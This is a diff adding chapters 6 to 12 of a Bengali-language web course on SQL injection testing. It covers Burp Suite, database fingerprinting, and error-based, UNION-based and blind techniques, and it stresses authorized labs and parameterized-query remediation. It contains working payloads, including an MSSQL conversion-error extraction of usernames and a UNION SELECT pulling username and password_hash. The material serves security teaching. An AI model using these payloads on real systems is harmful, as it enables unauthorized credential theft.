+      <p>প্রতিটি request/response জোড়া (raw HTTP, screenshot, timestamp) সংরক্ষণ করুন — রিপোর্ট লেখার সময় এগুলোই মূল প্রমাণ (অধ্যায় ১৯)।</p>
+    </li>
+    <li>
+      <h3>False Positive বাদ দেওয়া</h3>
+      <p>একই test কমপক্ষে দু'বার পুনরাবৃত্তি করে সামঞ্জস্য (consistency) যাচাই করুন (অধ্যায় ১৮)।</p>
+    </li>
+    <li>
+      <h3>Impact যাচাই</h3>
+      <p>Injection নিশ্চিত হলে, ন্যূনতম প্রয়োজনীয় প্রমাণ (যেমন database version, বা একটি non-sensitive টেবিলের নাম) দিয়ে impact দেখান — অতিরিক্ত ডেটা বের করার প্রয়োজন নেই (অধ্যায় ১৬)।</p>
+    </li>
+    <li>
+      <h3>Professional Report তৈরি</h3>
+      <p>অধ্যায় ১৯-এর টেমপ্লেট অনুসরণ করে একটি সম্পূর্ণ, reproducible রিপোর্ট লিখুন।</p>
+    </li>
+  </ol>
+
+  <div class="exercise"><h4>অনুশীলন</h4><p>একটি authorized lab endpoint-এ এই ১৫টি ধাপ ক্রমানুসারে অনুসরণ করে একটি testing log তৈরি করুন — প্রতিটি ধাপে কী পর্যবেক্ষণ করলেন তা লিখুন।</p></div>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>Manual SQLi টেস্টিং একটি শৃঙ্খলাবদ্ধ, ধাপে-ধাপে প্রক্রিয়া — scope যাচাই থেকে শুরু করে রিপোর্ট লেখা পর্যন্ত। প্রতিটি ধাপে একটি মাত্র variable বদলে controlled পর্যবেক্ষণ রাখাই নির্ভরযোগ্য সিদ্ধান্তের চাবিকাঠি।</p></div>
+
+  <div class="qa"><h3>Knowledge-check</h3><ol>
+    <li>একসাথে একাধিক parameter বদলানো কেন সমস্যাজনক?</li>
+    <li>Baseline response কেন প্রথমে তৈরি করা জরুরি?</li>
+    <li>Impact যাচাইয়ের সময় কেন অতিরিক্ত ডেটা বের করার প্রয়োজন নেই?</li>
+  </ol></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter05"><span>পূর্ববর্তী</span>অধ্যায় ০৫</a>
+    <a class="next" href="/chapter07"><span>পরবর্তী</span>অধ্যায় ০৭ — Burp Suite দিয়ে SQLi Testing</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch07">
+  <div class="eyebrow">অধ্যায় ০৭ · টেস্টিং</div>
+  <h1>Burp Suite দিয়ে SQLi Testing</h1>
+  <p class="sub">Proxy, Repeater ও Intruder দিয়ে বাস্তবসম্মত ধাপে ধাপে SQLi টেস্টিং।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch07" id="done-ch07"><label for="done-ch07">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>Proxy, HTTP History, Repeater ও Intruder-এর ভূমিকা</h2>
+  <div class="grid2">
+    <div class="card"><h4>Proxy</h4><p>ব্রাউজার ও সার্ভারের মাঝখানে বসে প্রতিটি request/response ক্যাপচার করে — ম্যানুয়াল টেস্টিং-এর শুরু এখান থেকেই।</p></div>
+    <div class="card"><h4>HTTP History</h4><p>সব ক্যাপচার হওয়া request-এর তালিকা, যেখান থেকে যেকোনোটি Repeater/Intruder-এ পাঠানো যায়।</p></div>
+    <div class="card"><h4>Repeater</h4><p>একটি request বারবার, ছোট পরিবর্তন করে পাঠিয়ে response তুলনা করার টুল — manual SQLi টেস্টিং-এর মূল কর্মক্ষেত্র।</p></div>
+    <div class="card"><h4>Intruder</h4><p>একটি নির্দিষ্ট position-এ স্বয়ংক্রিয়ভাবে একাধিক payload বসিয়ে ব্যাচ-টেস্ট চালানোর টুল — কিন্তু এটি manual বিশ্লেষণের বিকল্প নয়।</p></div>
+  </div>
+
+  <h2>Request ও Response পড়ার নিয়ম</h2>
+  <div class="codeblock"><div class="cb-head"><span>ShopMock — raw HTTP request উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>GET /product?id=7 HTTP/1.1
+Host: shopmock.local
+Cookie: session=eyJhbGciOi...
+User-Agent: Mozilla/5.0
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 4213
+
+&lt;h1&gt;Wireless Mouse&lt;/h1&gt;...</code></pre></div>
+  <p>প্রতিটি অংশ লক্ষ্য করুন — method, path, query string, headers, cookie, body (POST হলে), এবং response-এর status line, headers, body। SQLi টেস্টিং-এর সময় request-এর যেকোনো অংশ (শুধু query parameter নয়) পরিবর্তনযোগ্য বলে বিবেচনা করুন।</p>
+
+  <h2>URL Encoding ও Form Encoding</h2>
+  <p>Single quote URL-এ পাঠাতে হলে <code>%27</code> ব্যবহার করতে হতে পারে (Burp Repeater সাধারণত এটি স্বয়ংক্রিয়ভাবে সামলায়, কিন্তু raw curl/script ব্যবহার করলে manually encode করা জরুরি)। স্পেস <code>%20</code> বা <code>+</code>, এবং <code>#</code> (comment) পাঠাতে <code>%23</code> প্রয়োজন হতে পারে কারণ <code>#</code> URL fragment হিসেবে ব্রাউজার/প্রক্সিতে আলাদাভাবে ট্রিট হয়।</p>
+
+  <h2>JSON Body Modification</h2>
+  <div class="codeblock"><div class="cb-head"><span>Repeater-এ JSON body edit</span><button class="copy-btn">কপি</button></div><pre><code>মূল:     {"id": 7}
+পরিবর্তিত: {"id": "7'"}
+পরিবর্তিত: {"id": "7 AND 1=1"}</code></pre></div>
+  <p>লক্ষ্য রাখুন JSON valid থাকে কি না — payload-এর মধ্যে unescaped double quote থাকলে পুরো JSON parse ব্যর্থ হবে এবং আপনি একটি ভিন্ন (JSON parsing) error পাবেন, যা SQLi-এর সাথে বিভ্রান্তিকর হতে পারে।</p>
+
+  <h2>Cookie ও Header Inspection</h2>
+  <p>Repeater-এ cookie/header মান সরাসরি edit করা যায়। যদি কোনো cookie ডিক্রিপ্ট করা দরকার হয় (যেমন base64-এ এনকোড করা JSON), তাহলে Burp-এর Inspector প্যানেল বা Decoder টুল ব্যবহার করুন।</p>
+
+  <h2>Baseline Comparison</h2>
+  <p>Burp Repeater-এর একাধিক ট্যাবে বেসলাইন ও টেস্ট request পাশাপাশি রেখে Comparer টুল (right-click → "Send to Comparer") দিয়ে দুটি response-এর শব্দ-পর্যায়ের (word-level) পার্থক্য visually দেখা যায় — এটি ছোট পার্থক্য ধরতে কার্যকর।</p>
+
+  <h2>Response Length, Status Code, Body ও Timing Analysis</h2>
+  <table>
+    <thead><tr><th>সংকেত</th><th>কীভাবে দেখবেন</th></tr></thead>
+    <tbody>
+      <tr><td>Length</td><td>Repeater-এর response panel-এর উপরে প্রদর্শিত byte count</td></tr>
+      <tr><td>Status code</td><td>Response-এর প্রথম লাইন (200, 403, 500 ইত্যাদি)</td></tr>
+      <tr><td>Body content</td><td>নির্দিষ্ট টেক্সট (যেমন প্রোডাক্ট নাম) থাকা/না-থাকা</td></tr>
+      <tr><td>Timing</td><td>Repeater-এর response time ইন্ডিকেটর (ms); একাধিকবার পাঠিয়ে গড় নিন</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Manual Testing বনাম Automated Scanner</h2>
+  <p>Burp-এর automated scanner (Pro ভার্সনে) দ্রুত অনেক parameter স্ক্যান করতে পারে, কিন্তু context-aware নয় — এটি false positive/negative দুটোই তৈরি করতে পারে, বিশেষ করে blind বা second-order SQLi-তে। Manual verification সবসময় চূড়ান্ত সিদ্ধান্তের আগে প্রয়োজন (অধ্যায় ১৫-এ বিস্তারিত)।</p>
+
+  <h2>Intruder দিয়ে Authorized Lab Testing</h2>
+  <p>Intruder-এ "Sniper" মোড ব্যবহার করে একটি parameter position-এ একাধিক payload (যেমন quote ভ্যারিয়েশন) পাঠিয়ে response length/status-এর কলাম দেখে দ্রুত outlier শনাক্ত করা যায়। এটি শুধুমাত্র authorized lab-এ, নিয়ন্ত্রিত request rate-এ ব্যবহার করুন।</p>
+
+  <h2>Rate Limiting ও Request Volume নিয়ন্ত্রণ</h2>
+  <p>Intruder-এর "Resource Pool" সেটিংসে concurrent request সংখ্যা ও throttling নিয়ন্ত্রণ করা যায় — অতিরিক্ত দ্রুত request পাঠানো target সার্ভারে অনিচ্ছাকৃত লোড তৈরি করতে পারে, যা অননুমোদিত আচরণ হিসেবে গণ্য হতে পারে।</p>
+
+  <h2>Evidence সংরক্ষণ</h2>
+  <p>Burp-এর "Save item" ফিচার দিয়ে প্রতিটি গুরুত্বপূর্ণ request/response জোড়া export করুন (.txt বা Burp project ফাইল হিসেবে) — রিপোর্ট লেখার সময় এগুলো সরাসরি উদ্ধৃত করা যাবে।</p>
+
+  <h2>Common Burp Suite Mistakes</h2>
+  <ul>
+    <li>একসাথে একাধিক parameter পরিবর্তন করে Repeater-এ পাঠানো, ফলে কোন পরিবর্তনে প্রভাব পড়ল তা অস্পষ্ট থাকা।</li>
+    <li>URL-encoded payload ভুলভাবে double-encode করা, ফলে payload-টি backend-এ ভিন্নভাবে পৌঁছানো।</li>
+    <li>Session cookie expire হয়ে যাওয়ার পরও পুরনো request পাঠিয়ে ভুল সিদ্ধান্তে পৌঁছানো (৪০১/৪০৩ response-কে vulnerability-না-থাকা হিসেবে ভুল বোঝা)।</li>
+    <li>Intruder দিয়ে rate-limit/WAF trigger করে ফেলা, যা পরবর্তী সব টেস্টকে প্রভাবিত করে।</li>
+  </ul>
+
+  <div class="exercise"><h4>অনুশীলন</h4><p>একটি authorized lab request Repeater-এ নিয়ে, Comparer টুল ব্যবহার করে একটি baseline ও একটি <code>AND 1=2</code> টেস্ট response-এর মধ্যে word-level পার্থক্য খুঁজে বের করুন।</p></div>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>Burp Suite-এর Proxy/Repeater/Intruder/Comparer একসাথে ব্যবহার করে systematic, evidence-based SQLi টেস্টিং সম্ভব। Automated scanning দ্রুত কিন্তু context-blind — manual verification সবসময় প্রয়োজন।</p></div>
+
+  <div class="qa"><h3>Knowledge-check</h3><ol>
+    <li>Comparer টুল কখন বিশেষভাবে উপযোগী?</li>
+    <li>JSON body-তে payload বসানোর সময় কোন common mistake এড়ানো উচিত?</li>
+    <li>Intruder ব্যবহার করার সময় rate limiting কেন গুরুত্বপূর্ণ?</li>
+  </ol></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter06"><span>পূর্ববর্তী</span>অধ্যায় ০৬</a>
+    <a class="next" href="/chapter08"><span>পরবর্তী</span>অধ্যায় ০৮ — Database Fingerprinting</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch08">
+  <div class="eyebrow">অধ্যায় ০৮ · টেস্টিং</div>
+  <h1>Database Fingerprinting</h1>
+  <p class="sub">কোন database engine ব্যবহৃত হচ্ছে তা শনাক্ত করা — পরবর্তী সব payload নির্বাচনের ভিত্তি।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch08" id="done-ch08"><label for="done-ch08">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <p>SQLi নিশ্চিত হওয়ার পর পরবর্তী গুরুত্বপূর্ণ ধাপ হলো backend database engine শনাক্ত করা — কারণ syntax, function নাম, এবং comment style প্রতিটি DBMS-এ ভিন্ন। ভুল DBMS ধরে নিয়ে payload পাঠালে শুধু সময় নষ্ট হয় না, বরং ভুল সিদ্ধান্তেও পৌঁছানো যায়।</p>
+
+  <h2>Syntax Differences</h2>
+  <table>
+    <thead><tr><th></th><th>MySQL</th><th>PostgreSQL</th><th>MSSQL</th><th>Oracle</th><th>SQLite</th></tr></thead>
+    <tbody>
+      <tr><td>Version query</td><td><code>SELECT @@version</code></td><td><code>SELECT version()</code></td><td><code>SELECT @@version</code></td><td><code>SELECT banner FROM v$version</code></td><td><code>SELECT sqlite_version()</code></td></tr>
+      <tr><td>Current DB</td><td><code>SELECT database()</code></td><td><code>SELECT current_database()</code></td><td><code>SELECT DB_NAME()</code></td><td><code>SELECT ora_database_name FROM dual</code></td><td>N/A (ফাইল-ভিত্তিক)</td></tr>
+      <tr><td>Table listing</td><td><code>information_schema.tables</code></td><td><code>information_schema.tables</code></td><td><code>information_schema.tables</code></td><td><code>all_tables</code></td><td><code>sqlite_master</code></td></tr>
+    </tbody>
+  </table>
+
+  <h2>String Concatenation</h2>
+  <div class="codeblock"><pre><code>MySQL:      CONCAT('a','b')         → 'ab'
+PostgreSQL: 'a' || 'b'               → 'ab'
+MSSQL:      'a' + 'b'                → 'ab'
+Oracle:     'a' || 'b'               → 'ab'
+SQLite:     'a' || 'b'               → 'ab'</code></pre></div>
+  <p>MSSQL-এ <code>+</code> ব্যবহার হওয়ায়, numeric context-এ এটি addition-ও হতে পারে — তাই type নিশ্চিত করা জরুরি।</p>
+
+  <h2>Comment Syntax</h2>
+  <table>
+    <thead><tr><th>DBMS</th><th>Single-line</th><th>নোট</th></tr></thead>
+    <tbody>
+      <tr><td>MySQL</td><td><code>-- </code> (স্পেস আবশ্যক) বা <code>#</code></td><td><code>--</code>-এর পর স্পেস না থাকলে MySQL এটি কমেন্ট হিসেবে না-ও নিতে পারে</td></tr>
+      <tr><td>PostgreSQL</td><td><code>--</code></td><td>স্পেস আবশ্যক নয়</td></tr>
+      <tr><td>MSSQL</td><td><code>--</code></td><td>স্পেস আবশ্যক নয়</td></tr>
+      <tr><td>Oracle</td><td><code>--</code></td><td>স্পেস আবশ্যক নয়</td></tr>
+      <tr><td>SQLite</td><td><code>--</code></td><td>স্পেস আবশ্যক নয়</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Boolean Expression আচরণ</h2>
+  <p>বেশিরভাগ DB-তে <code>1=1</code>/<code>1=2</code> একইভাবে কাজ করে, কিন্তু Oracle-এ standalone boolean expression (<code>SELECT 1=1</code>) সরাসরি সমর্থিত নয় — Oracle-এ boolean শুধু <code>WHERE</code>/<code>CASE</code>-এর ভেতরেই ব্যবহারযোগ্য, যা অন্যান্য DB থেকে আলাদা আচরণ।</p>
+
+  <h2>Delay Function পার্থক্য</h2>
+  <p>অধ্যায় ০৩ ও ০৫-এ বিস্তারিত সিনট্যাক্স দেওয়া আছে — মূল পয়েন্ট: MySQL-এ <code>SLEEP()</code>, PostgreSQL-এ <code>pg_sleep()</code>, MSSQL-এ <code>WAITFOR DELAY</code> (statement, function নয়), Oracle-এ <code>DBMS_LOCK.SLEEP()</code> (প্রায়ই execute privilege লাগে), SQLite-এ কোনো native delay function নেই — heavy recursive query দিয়ে কৃত্রিমভাবে দেরি তৈরি করতে হয়, যা কম নির্ভরযোগ্য।</p>
+
+  <h2>UNION Compatibility</h2>
+  <p>সব প্রধান DBMS <code>UNION</code> সমর্থন করে, কিন্তু Oracle-এ প্রতিটি <code>SELECT</code>-এ একটি টেবিল রেফারেন্স লাগে (তাই <code>FROM dual</code>), এবং column data type গুলোর মধ্যে implicit conversion-এর নিয়ম DB-ভেদে কিছুটা আলাদা হতে পারে (যেমন MSSQL প্রায়ই string-কে integer-এ রূপান্তরের চেষ্টা করে error দেয়, যা একটি fingerprinting সংকেতও হতে পারে)।</p>
+
+  <h2>Version Identification Concepts</h2>
+  <p>শুধু version string পাওয়াই যথেষ্ট না — version থেকে বোঝা যায় কোন ফিচার (যেমন নির্দিষ্ট function) উপলব্ধ কি না। পুরনো MySQL ভার্সনে <code>information_schema</code> না থাকতে পারে, যা পরবর্তী ধাপের কৌশল পরিবর্তন করে দেয়।</p>
+
+  <h2>Database-Specific False Positives</h2>
+  <ul>
+    <li>MSSQL-এ <code>+</code> ব্যবহার করে string concatenation টেস্ট করতে গিয়ে numeric addition-এর সাথে গুলিয়ে ফেলা।</li>
+    <li>MySQL-এ <code>--</code>-এর পর স্পেস ভুলে বাদ দেওয়ায় কমেন্ট কাজ না করা — ভুলভাবে "injection নেই" সিদ্ধান্তে পৌঁছানো।</li>
+    <li>Oracle-এ <code>FROM dual</code> ছাড়া <code>UNION SELECT</code> ব্যবহার করে error পাওয়াকে "vulnerability নেই" বলে ভুল বোঝা, যদিও আসল কারণ শুধু syntax ভুল।</li>
+  </ul>
+
+  <div class="exercise"><h4>অনুশীলন</h4><p>একটি lab টার্গেটে error-based বা UNION-based কৌশল ব্যবহার করে উপরের টেবিল থেকে অন্তত তিনটি ভিন্ন fingerprinting query চালিয়ে backend DBMS শনাক্ত করুন।</p></div>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>Database fingerprinting ভুল হলে ভুল payload পাঠানো হয় এবং ভুল সিদ্ধান্তে পৌঁছানোর ঝুঁকি থাকে। Comment syntax, string concatenation, delay function ও UNION-এর নিয়ম প্রতিটি DBMS-এ আলাদা — তাই fingerprint নিশ্চিত হওয়ার পরই পরবর্তী exploitation কৌশল বেছে নেওয়া উচিত।</p></div>
+
+  <div class="qa"><h3>Knowledge-check</h3><ol>
+    <li>MySQL-এ <code>--</code> কমেন্ট ব্যবহারে কোন ছোট কিন্তু গুরুত্বপূর্ণ নিয়ম মনে রাখতে হবে?</li>
+    <li>Oracle-এ <code>UNION SELECT NULL</code> কেন প্রায়ই error দেয়?</li>
+    <li>SQLite-এ time-based blind SQLi কেন তুলনামূলক কঠিন?</li>
+  </ol></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter07"><span>পূর্ববর্তী</span>অধ্যায় ০৭</a>
+    <a class="next" href="/chapter09"><span>পরবর্তী</span>অধ্যায় ০৯ — Error-Based SQLi (সম্প্রসারিত)</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch09">
+  <div class="eyebrow">অধ্যায় ০৯ · টেকনিক</div>
+  <h1>Error-Based SQLi — সম্প্রসারিত</h1>
+  <p class="sub">অধ্যায় ০৩-এ error-based SQLi-এর ভিত্তি দেওয়া হয়েছে। এখানে আরও গভীরভাবে error interpretation ও suppression-পরবর্তী কৌশল আলোচনা করা হলো।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch09" id="done-ch09"><label for="done-ch09">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>Syntax Error বনাম Type Error</h2>
+  <p>দুই ধরনের error-ই SQLi-এর ইঙ্গিত দিতে পারে, কিন্তু তাদের উৎস আলাদা:</p>
+  <ul>
+    <li><strong>Syntax error:</strong> query-এর গঠন নিজেই ভেঙে যাওয়া (যেমন un-closed quote)। এটি সরাসরি বোঝায় input অপরিবর্তিতভাবে query-তে বসছে।</li>
+    <li><strong>Type error:</strong> query সিনট্যাক্টিকভাবে সঠিক, কিন্তু একটি column-এর প্রত্যাশিত data type-এর সাথে input-এর type মেলেনি (যেমন একটি integer column-এ string বসানোর চেষ্টা)। এটি ইঙ্গিত দেয় যে input raw ভাবে একটি comparison/expression-এ ব্যবহৃত হচ্ছে — প্রায়ই "type juggling" কৌশলে exploit করা হয়।</li>
+  </ul>
+  <div class="codeblock"><div class="cb-head"><span>Type-error-ভিত্তিক ডেটা এক্সট্র্যাকশন (MSSQL ধারণা)</span><button class="copy-btn">কপি</button></div><pre><code>' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users))--
+→ যদি username সংখ্যা না হয়, MSSQL conversion error ছোড়ে, এবং সেই
+  error message-এর মধ্যে মাঝে মাঝে প্রকৃত username মান দেখা যায়।</code></pre></div>
+
+  <h2>Error Leakage বনাম Confirmed SQLi</h2>
+  <p>শুধু একটি error message দেখা যাওয়া মানেই injection "confirmed" নয়। Confirm করার জন্য তিনটি শর্ত পূরণ হওয়া উচিত: (১) error message database engine-নির্দিষ্ট, (২) input পরিবর্তন করলে error ধারাবাহিকভাবে পুনরুৎপাদনযোগ্য, এবং (৩) error-এর বিষয়বস্তু input-এর সাথে যৌক্তিকভাবে সম্পর্কিত (যেমন ঠিক সেই quote/character-এর কাছে)।</p>
+
+  <h2>Error Suppression হলে Testing Strategy</h2>
+  <p>যদি application generic error page দেখায় (verbose error suppress করা), তাহলে error-based কৌশল সরাসরি কাজ করবে না। তখনকার কৌশল:</p>
+  <ol>
+    <li>HTTP status code-এ সূক্ষ্ম পার্থক্য আছে কি না দেখুন (যেমন ৫০০ বনাম ৪০০)।</li>
+    <li>Response time-এ পার্থক্য আছে কি না দেখুন (database যদি query processing-এ বেশি সময় নেয়, suppress করা error-ও মাঝে মাঝে সময় নেয়)।</li>
+    <li>Boolean-based বা time-based blind কৌশলে স্থানান্তরিত হোন (অধ্যায় ১১)।</li>
+  </ol>
+
+  <h2>Error Handling ও Remediation</h2>
+  <p>Production-এ centralised exception handling middleware ব্যবহার করে সব database exception catch করে একটি generic message দেখানো উচিত, এবং বিস্তারিত stack trace শুধুমাত্র server-side log-এ (secret/PII বাদ দিয়ে) সংরক্ষণ করা উচিত। লগে অস্বাভাবিক frequency-তে SQL error এলে alert তৈরি করা একটি কার্যকর detection ব্যবস্থা।</p>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>Error message-এর ধরন (syntax বনাম type) ভিন্ন তথ্য দেয়, এবং শুধু একটি error দেখেই নিশ্চিত হওয়া যায় না — reproducibility ও logical সম্পর্ক যাচাই আবশ্যক। Error suppress করা থাকলে timing/boolean কৌশলে সরে যেতে হয়।</p></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter08"><span>পূর্ববর্তী</span>অধ্যায় ০৮</a>
+    <a class="next" href="/chapter10"><span>পরবর্তী</span>অধ্যায় ১০ — UNION-Based SQLi (সম্প্রসারিত)</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch10">
+  <div class="eyebrow">অধ্যায় ১০ · টেকনিক</div>
+  <h1>UNION-Based SQLi — সম্প্রসারিত</h1>
+  <p class="sub">Displayable column শনাক্তকরণের গভীর কৌশল ও defensive implication।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch10" id="done-ch10"><label for="done-ch10">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>Displayable Columns শনাক্ত করার গভীর কৌশল</h2>
+  <p>অধ্যায় ০৩-এ NULL marker পদ্ধতি দেখানো হয়েছে। যদি response-এ কোনো কলামই সরাসরি দৃশ্যমান না হয় (যেমন শুধু একটি success/failure বার্তা দেখায়), তাহলে UNION-based সরাসরি কাজ করবে না — তখন boolean/time-based কৌশলে ফিরে যেতে হবে। যদি একাধিক কলাম দৃশ্যমান হয়, প্রতিটি position আলাদাভাবে marker দিয়ে ম্যাপ করুন যাতে পরে সঠিক position-এ লক্ষ্যবস্তু ডেটা বসানো যায়।</p>
+
+  <h2>Data Type Compatibility — গভীর আলোচনা</h2>
+  <p>যদি একটি কলাম integer প্রত্যাশা করে কিন্তু আপনি string বসান, তাহলে error আসবে — কিন্তু এই error নিজেই একটি উপযোগী সংকেত (বোঝায় সেই position integer-type)। কিছু DBMS (MySQL) implicit type conversion-এ শিথিল, আবার কিছু (PostgreSQL, MSSQL) কঠোর — একটি payload যা MySQL-এ নীরবে কাজ করে তা PostgreSQL-এ সরাসরি error দিতে পারে।</p>
+  <div class="codeblock"><div class="cb-head"><span>Multi-value একই কলামে বসানো (ডেটা বেশি জায়গায় দেখানোর কৌশল)</span><button class="copy-btn">কপি</button></div><pre><code>UNION SELECT NULL, CONCAT(username,0x3a,password_hash), NULL FROM users--</code></pre></div>
+  <p>যদি শুধুমাত্র একটি কলাম দৃশ্যমান হয়, একাধিক মান একসাথে concatenate করে (একটি আলাদা separator সহ, যেমন <code>0x3a</code> যা কোলন <code>:</code>-এর hex) একই position-এ একাধিক তথ্য দেখানো সম্ভব।</p>
+
+  <h2>Database-Specific Example সংক্ষেপ</h2>
+  <p>Oracle-এ <code>FROM dual</code> আবশ্যক; MSSQL-এ data type mismatch প্রায়ই কঠোরভাবে ধরা পড়ে; MySQL তুলনামূলক নমনীয়। বিস্তারিত টেবিল অধ্যায় ০৮-এ।</p>
+
+  <h2>Common Mistakes</h2>
+  <ul>
+    <li>Column count সঠিকভাবে বের না করেই সরাসরি ডেটা বের করার চেষ্টা করা।</li>
+    <li>একাধিক row থাকা sub-query ব্যবহার করে ফেলা, যেখানে single-value প্রত্যাশিত (ফলে "subquery returns more than one row" error)।</li>
+  </ul>
+
+  <h2>Defensive Implications</h2>
+  <p>UNION-based attack ঠেকানোর মূল উপায় এখনও parameterized query — কারণ তাহলে <code>UNION</code> শব্দটি কখনোই SQL keyword হিসেবে parse হবে না, যতই ইনপুটে উপস্থিত থাকুক। এছাড়া database error-কে ইউজার থেকে আড়াল রাখা UNION-based reconnaissance-কে কঠিন করে তোলে।</p>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>UNION-based SQLi-এর কার্যকারিতা নির্ভর করে display হওয়া কলাম ও তাদের data type সঠিকভাবে ম্যাপ করার উপর। ভুল column count বা type mismatch থেকে আসা error-কেও তথ্যবহুল সংকেত হিসেবে ব্যবহার করা যায়।</p></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter09"><span>পূর্ববর্তী</span>অধ্যায় ০৯</a>
+    <a class="next" href="/chapter11"><span>পরবর্তী</span>অধ্যায় ১১ — Blind SQL Injection (সম্প্রসারিত)</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch11">
+  <div class="eyebrow">অধ্যায় ১১ · টেকনিক</div>
+  <h1>Blind SQL Injection — সম্প্রসারিত</h1>
+  <p class="sub">Boolean ও time-based কৌশলের গভীর তুলনা, conditional inference কাঠামো, এবং নির্ভরযোগ্য verification।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch11" id="done-ch11"><label for="done-ch11">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>Boolean-Based বনাম Time-Based — কখন কোনটি</h2>
+  <table>
+    <thead><tr><th>পরিস্থিতি</th><th>পছন্দনীয় কৌশল</th></tr></thead>
+    <tbody>
+      <tr><td>Response content-এ visible পার্থক্য আছে</td><td>Boolean-based (দ্রুত, নেটওয়ার্ক-নির্ভর নয়)</td></tr>
+      <tr><td>Response সম্পূর্ণ identical, কোনো visible channel নেই</td><td>Time-based (ধীর কিন্তু নির্ভরযোগ্য)</td></tr>
+      <tr><td>Rate limiting/WAF আছে</td><td>Boolean-based পছন্দনীয় (কম সন্দেহজনক পজিশনে কম request)</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Conditional Inference-এর কাঠামো</h2>
+  <p>উভয় কৌশলেই মূল কাঠামো একই: একটি প্রশ্ন তৈরি করুন যার উত্তর শুধু true/false (যেমন "ডেটার প্রথম অক্ষর কি 'a'-এর চেয়ে বড়?"), এরপর binary-search পদ্ধতিতে ধাপে ধাপে উত্তর সংকুচিত করুন যতক্ষণ না সঠিক মান পাওয়া যায়। এই কাঠামোটিকে "oracle" (হ্যাঁ/না উত্তরদাতা) মডেল হিসেবে চিন্তা করা যায় — database প্রতিটি প্রশ্নের জন্য একটি বিট তথ্য প্রকাশ করে।</p>
+
+  <h2>False Positives ও False Negatives — গভীরভাবে</h2>
+  <ul>
+    <li><strong>False positive:</strong> dynamic content (ভিজিটর কাউন্টার, টাইমস্ট্যাম্প), session-নির্ভর ডেটা, বা caching condition-independent পার্থক্য তৈরি করে যা ভুলভাবে injection বলে মনে হতে পারে।</li>
+    <li><strong>False negative:</strong> যদি application একই response cache করে রাখে (CDN বা server-side caching), তাহলে প্রকৃত condition পরিবর্তনের প্রভাব response-এ নাও দেখা যেতে পারে, ফলে vulnerability থাকা সত্ত্বেও miss হয়ে যেতে পারে।</li>
+  </ul>
+
+  <h2>Safe, Low-Impact Verification</h2>
+  <p>Confirm করার জন্য ডেটাবেসের গঠন সম্পর্কে ন্যূনতম প্রশ্ন ব্যবহার করুন (যেমন <code>database()</code>-এর দৈর্ঘ্য) — পুরো ডেটা table বের করার চেষ্টা না করে। Lab-এর বাইরে বাস্তব প্রোগ্রামে, একটি single non-sensitive value (যেমন DB version) যথেষ্ট প্রমাণ — এটি অধ্যায় ১৬-এর নীতির সাথে সামঞ্জস্যপূর্ণ।</p>
+
+  <h2>Mitigation</h2>
+  <p>Parameterized query উভয় ধরনের blind SQLi-ই প্রতিরোধ করে, কারণ কোনো condition-ই আর user input-নির্ভর SQL syntax হিসেবে parse হবে না।</p>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>Boolean ও time-based blind উভয়ই একই "oracle" নীতির উপর ভিত্তি করে কাজ করে — পার্থক্য শুধু সংকেত চ্যানেলে (content বনাম timing)। সঠিক কৌশল বেছে নেওয়া নির্ভর করে application-এর আচরণ ও পরিবেশগত সীমাবদ্ধতার (rate limiting, caching) উপর।</p></div>
+
+  <div class="qa"><h3>Knowledge-check</h3><ol>
+    <li>Type error কীভাবে ডেটা এক্সট্র্যাকশনে ব্যবহার করা যায়?</li>
+    <li>Caching কীভাবে blind SQLi টেস্টিং-এ false negative তৈরি করতে পারে?</li>
+    <li>"Oracle" মডেল বলতে blind SQLi-এর প্রসঙ্গে কী বোঝানো হয়েছে?</li>
+  </ol></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter10"><span>পূর্ববর্তী</span>অধ্যায় ১০</a>
+    <a class="next" href="/chapter12"><span>পরবর্তী</span>অধ্যায় ১২ — WAF ও Filter Bypass</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch12">
+  <div class="eyebrow">অধ্যায় ১২ · টেকনিক</div>
+  <h1>WAF ও Filter Bypass — Advanced Defensive Research</h1>
+  <p class="sub">WAF, input filtering ও SQL parser-এর পার্থক্য — defensive গবেষণার দৃষ্টিকোণ থেকে।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch12" id="done-ch12"><label for="done-ch12">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
